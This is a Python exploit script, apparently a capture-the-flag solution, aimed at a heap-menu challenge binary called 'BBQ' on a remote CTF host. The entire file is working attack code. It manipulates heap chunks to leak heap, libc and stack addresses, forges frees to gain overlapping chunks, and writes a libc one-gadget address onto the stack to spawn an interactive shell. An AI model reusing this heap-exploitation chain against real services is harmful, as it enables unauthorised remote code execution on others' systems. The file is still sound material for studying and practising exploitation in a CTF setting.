#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import re

bin_file = './BBQ'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'pwn1.chal.ctf.westerns.tokyo', 'port':21638})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10
#offset_libc_leave       = 0x00042351

#==========

def attack(conn):
    bbq = BBQ(conn)

    bbq.buy('Beef', 10)

    bbq.buy('A'*0x20, 1)
    bbq.buy('B'*0x10, 1)

    bbq.buy('X'*0x10+p64(0xdeadbeef11), 1)

    bbq.buy(p64(0xdeadbeef11), 0x91)
    bbq.grill('Beef', 0)
    bbq.grill('Beef', 1)
    bbq.grill('Beef', 2)
    bbq.eat(0)

    bbq.grill('_'*0x27)
    bbq.eat(0)  #

    stock, _ = bbq.list()
    addr_heap_base  = u(stock[1]) - 0x150
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    bbq.grill('_'*0x28+p64(addr_heap_base + 0x130))
    bbq.eat(0)  # cosolidate to top, malloc_consolidate

    stock, _ = bbq.list()
    addr_libc_mainarena  = u(stock[1]) - 0x58
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_environ   = libc.symbols['environ']
    #addr_libc_leave     = libc.address + offset_libc_leave
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    bbq.grill('Beef', 4)
    bbq.grill('Beef', 3)
    bbq.eat(4)
    bbq.buy(p64(addr_libc_environ), 1)

    stock, _ = bbq.list()
    addr_stack  = u(stock[1]) - 0xf8
    info('addr_stack        = 0x{:08x}'.format(addr_stack))

    # clean up
    bbq.buy('C'*0x40, 1)

    bbq.buy(p64(0xdeadbeef11), 0x1b1)
    bbq.grill('Beef', 4)
    bbq.grill('Beef', 5)
    bbq.buy('1'*0x10+p64(0xdeadbeef11), 1)    # 1
    bbq.buy('2'*0x10+p64(0xdeadbeef11), 1)    # 2
    bbq.buy('3'*0x10+p64(0xdeadbeef11), 1)    # 3
    bbq.buy('4'*0x10+p64(0xdeadbeef11), 1)    # 4
    bbq.eat(4)
    bbq.grill('Beef', 4)
    bbq.eat(5)
    bbq.grill('Beef', 5)
    bbq.buy('5'*0x10+p64(0xdeadbeef11), 1)    # 5

    bbq.grill('_'*0x28+p64(addr_heap_base + 0x1d0))
    bbq.eat(0)  # cosolidate to top

    bbq.eat(5)
    bbq.eat(4)
    bbq.buy(p64(0xdeadbeef11), 1)
    bbq.buy('X'*0x10+p64(addr_heap_base + 0x10), 1)

    free_chunk(bbq, addr_heap_base + 0x260)         # 1
    bbq.buy(p64(addr_heap_base + 0x10), 1)          # any address

    free_chunk(bbq, addr_heap_base + 0x2a0)         # 2
    bbq.buy(p64(0xdeadbeef11), 1)

    # overwrap
    free_chunk(bbq, addr_heap_base + 0x210)
    free_chunk(bbq, addr_heap_base + 0x220)

    free_chunk(bbq, addr_heap_base + 0x2e0)         # 3
    bbq.buy(p64(0xdeadbeef11), 1)

    free_chunk(bbq, addr_heap_base + 0x320)         # 4
    free_chunk(bbq, addr_heap_base + 0x210)

    free_chunk(bbq, addr_heap_base + 0x360)         # 5

    bbq.buy(p64(addr_stack - 0x10), 1)
    bbq.grill('Beef', 4)

    conn.sendlineafter('Choice: ', str(0x21))
    conn.sendlineafter('name >> ', p(-1) + p64(libc.address + 0xf1147))
    conn.sendlineafter('amount >> ', str(1))

    conn.sendlineafter('Choice: ', '0')

def free_chunk(bbq, addr):
    bbq.grill('_'*0x28+p64(addr))
    bbq.eat(0)

class BBQ:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def buy(self, name, amount):
        self.sendlineafter('Choice: ', '1')
        if len(name) < 0x3f:
            name += '\n'
        self.sendafter('name >> ', name[:0x3f])
        self.sendlineafter('amount >> ', str(amount))

    def grill(self, name, index = None):
        self.sendlineafter('Choice: ', '2')
        if len(name) < 0x3f:
            name += '\n'
        self.sendafter('food >> ', name[:0x3f])
        if index is not None:
            self.sendlineafter('index >> ', str(index))

    def eat(self, index):
        self.sendlineafter('Choice: ', '3')
        self.sendlineafter('index >> ', str(index))

    def list(self):
        self.sendlineafter('Choice: ', '2')
        self.recvuntil('Food Stock List\n')
        stock = re.findall('\* (.*) ', self.recvuntil('\n\nCooking List'))
        cook  = re.findall('^\[[0-9]+\] (.*)\n', self.recvuntil('\nwhich food >> '))
        self.sendline('')
        return stock, cook

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
